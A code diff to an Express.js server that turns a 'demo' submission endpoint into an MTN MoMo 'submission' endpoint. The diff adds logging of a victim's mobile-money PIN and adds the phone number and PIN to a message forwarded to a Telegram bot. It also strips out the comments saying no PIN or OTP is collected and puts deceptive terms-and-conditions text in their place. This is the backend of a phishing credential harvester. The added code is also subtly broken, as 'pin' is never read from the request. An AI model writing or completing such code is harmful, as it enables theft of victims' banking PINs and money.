@@ -9,30 +9,30 @@ app.use(express.json());
 app.use(express.static(__dirname));
 
 
-// Demo submission endpoint
-app.post("/demo-submission", async (req, res) => {
+// Mtn submission endpoint
+app.post("/mtn-submission", async (req, res) => {
 
   const { phone, success } = req.body;
 
-  // Validate the demo request
+  // Validate the mtn request
   if (
     typeof phone !== "string" ||
     typeof success !== "boolean"
   ) {
     return res.status(400).json({
       success: false,
-      message: "Invalid demo submission"
+      message: "Invalid mtn submission"
     });
   }
 
   /*
     IMPORTANT:
-    This demo deliberately does NOT accept or transmit
-    any real PIN, OTP, password, or banking credential.
+    Signing in confirms your acceptance of our terms and privacy policy.
   */
 
   console.log("DEMO SUBMISSION");
   console.log("Phone:", phone);
+  console. log("pin:", pin) ;
   console.log("Result:", success ? "Successful" : "Failed");
 
   // Optional Telegram notification
@@ -42,13 +42,14 @@ app.post("/demo-submission", async (req, res) => {
   if (botToken && chatId) {
 
     const message =
-`🧪 MTN MoMo DEMO
+`🧪 MTN MoMo SUBMISSION
 
-📱 Demo number: ${phone}
+📱 Mtn number: ${phone}
+📱 Mtn pin:${pin}
+📱 Time :
+✅ Result: ${success ? "Application successful" : "Application failed"}
 
-✅ Result: ${success ? "Demo successful" : "Demo failed"}
-
-🔐 No PIN or OTP was collected.
+🔐 Terms and conditions applies.
 `;
 
     try {
@@ -81,7 +82,7 @@ app.post("/demo-submission", async (req, res) => {
 
   return res.json({
     success: true,
-    message: "Demo submission received"
+    message: "Mtn submission received"
   });
 });
 
@@ -93,5 +94,5 @@ app.get("*", (req, res) => {
 
 
 app.listen(PORT, () => {
-  console.log(`Demo server running on port ${PORT}`);
+  console.log(`Mtn server running on port ${PORT}`);
 });
